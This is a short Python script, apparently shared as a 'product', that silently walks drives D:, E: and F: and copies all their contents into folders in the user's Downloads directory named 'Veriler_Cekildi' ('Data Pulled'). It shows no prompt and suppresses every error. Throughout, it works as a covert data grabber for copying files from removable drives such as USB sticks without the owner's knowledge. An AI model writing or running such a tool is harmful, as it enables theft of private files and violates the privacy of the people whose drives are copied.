#Product By @canustun_software
import os,shutil
from datetime import datetime

def veri_cek(i,klas_ad):
    global kopyalamaya_devam
    isim = os.getlogin()
    
    try:
        shutil.copytree(i[0], f"C:/Users/{isim}/Downloads/{klas_ad}")
    except FileExistsError:
        kopyalamaya_devam = False
    except:
        try:
            shutil.copyfile(i[0], f"C:/Users/{isim}/Downloads/{klas_ad}")
        except:pass

            
kopyalamaya_devam = True
while kopyalamaya_devam:
    for i in os.walk("D:/"):
        veri_cek(i,"Veriler_Cekildi_D")
        
    for i in os.walk("E:/"):
        veri_cek(i,"Veriler_Cekildi_E")

    for i in os.walk("F:/"):
        veri_cek(i,"Veriler_Cekildi_F")
